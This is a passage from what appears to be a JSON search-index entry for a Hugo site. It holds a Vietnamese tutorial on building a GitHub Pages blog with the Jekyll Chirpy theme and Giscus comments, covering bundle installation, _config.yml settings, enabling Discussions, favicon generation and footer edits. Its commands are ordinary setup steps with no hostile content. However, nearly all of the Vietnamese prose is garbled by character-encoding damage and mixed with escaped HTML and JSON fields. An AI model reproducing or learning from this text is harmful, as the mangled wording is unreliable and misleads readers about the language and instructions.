kh√¥ng c·∫ßn sudo v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn /var/lib/gems.. bundle config set --local path \u0026#39;vendor/bundle\u0026#39; bundle install Usage Start the Jekyll Server ƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y:\nbundle exec jekyll s Configuration M·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong _config.yml, bao g·ªìm:\nlang: Set language cho website c·ªßa b·∫°n url: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n title: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar tagline: Subtitle, m√¥ t·∫£ trang web avatar: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng gif Comment feature via Giscus Ta s·ª≠ d·ª•ng Giscus l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: Disqus, Utterances, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t giscus v√†o Github. V√†o Settings c·ªßa repository ch·ªçn General v√† b·∫≠t Discussions ƒë·ªÉ giscus l∆∞u comments v√†o Discussions. Nh·∫≠p repository \u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng. Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website. C·∫•u h√¨nh giscus trong _config.yml provider: ch·ªçn giscus giscus: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü giscus v√†o bi·∫øn giscus. Customize the Favicon T·∫°o favicon ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng favicon m·∫∑c ƒë·ªãnh c·ªßa themes\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nTruy c·∫≠p Favicon Genarate Click Browse ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click Create Favicon ƒë·ªÉ t·∫°o. Click Download the generated favicon ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ. Gi·∫£i n√©n file v·ª´a t·∫£i, x√≥a 2 file d∆∞·ªõi ƒë√¢y: browserconfig.xml site.webmanifest Copy to√†n b·ªô file c√≤n l·∫°i v√† paste v√†o assets/img/favicons(n·∫øu ch∆∞a c√≥ th√¨ t·∫°o). Extends Remove meta tag in Footer C√≥ th·ªÉ x√≥a d√≤ng Using the Chirpy theme for Jekyll. b·∫±ng c√°c b∆∞·ªõc sau:\nT·∫°o file theo ƒë∆∞·ªùng d·∫´n sau _data/locales/en.yml. Copy n·ªôi dung en.yml v√† d√°n v√†o file v·ª´a t·∫°o. S·ª≠a n·ªôi dung bi·∫øn meta th√†nh \u0026quot;\u0026quot; Write a post Tham kh·∫£o rule ƒë·ªÉ vi·∫øt blog c·ªßa themes v√† s·ª≠ d·ª•ng Live Preview ƒë·ªÉ quan s√°t\n","permalink":"//localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eKhi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGithub Pages\u003c/strong\u003e: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJekyll\u003c/strong\u003e: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\u003c/p\u003e","title":"Github Pages with Jekyll themes and Giscus"}]